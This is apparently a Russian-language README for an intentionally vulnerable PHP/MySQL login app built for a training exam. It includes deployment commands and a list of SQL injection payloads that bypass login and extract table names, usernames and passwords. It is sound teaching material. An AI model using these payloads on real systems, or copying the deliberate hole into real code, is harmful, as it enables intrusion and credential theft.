# Obuhov_Web_app

Уязвимое веб-приложение (PHP + MySQL) для демо-экзамена.
Уязвимость: SQL-инъекция в форме авторизации (login.php).

## Структура
- `docker-compose.yml` — два контейнера: web (PHP+Apache) и db (MySQL)
- `Dockerfile` — образ PHP 8.1 + Apache + mysqli
- `init.sql` — создаёт таблицу users
- `src/` — код сайта:
  - `index.php` — редирект на login
  - `register.php` — регистрация (безопасная, prepared statement)
  - `login.php` — авторизация (УЯЗВИМАЯ для SQLi) + установка cookie
  - `welcome.php` — "Привет, имя" (только после входа, проверка cookie)
  - `logout.php` — выход
  - `db.php` — подключение к БД

## Развёртывание (на машине WEB_vuln внутри PNET)
```bash
cd ~/Desktop/Obuhov_Web_app      # или туда, куда склонировал
sudo docker compose up -d --build
```
Сайт: http://10.2.100.2  (или http://localhost с самой машины)

Проверить контейнеры:
```bash
sudo docker ps
```

Остановить:
```bash
sudo docker compose down
```

## CURL (задание 2) — регистрация через curl
```bash
curl -X POST http://10.2.100.2/register.php -d "username=Administrator&password=Admin123"
curl -X POST http://10.2.100.2/register.php -d "username=obuhov_so&password=stepan"
```

## SQLi (задание 3) — через форму авторизации
В поле "Логин" вводить инъекции (пароль оставлять любым/пустым):

1. Обход авторизации:
   `admin' -- `

2. Имя базы данных:
   `' UNION SELECT 1,database(),3 -- `

3. Таблицы (только пользовательские):
   `' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- `

4. Пользователи и пароли:
   `' UNION SELECT id,username,password FROM users -- `

5. Отдельно пароль Administrator:
   `' UNION SELECT id,username,password FROM users WHERE username='Administrator' -- `

Результат отображается на странице приветствия (Привет, <извлечённые данные>).
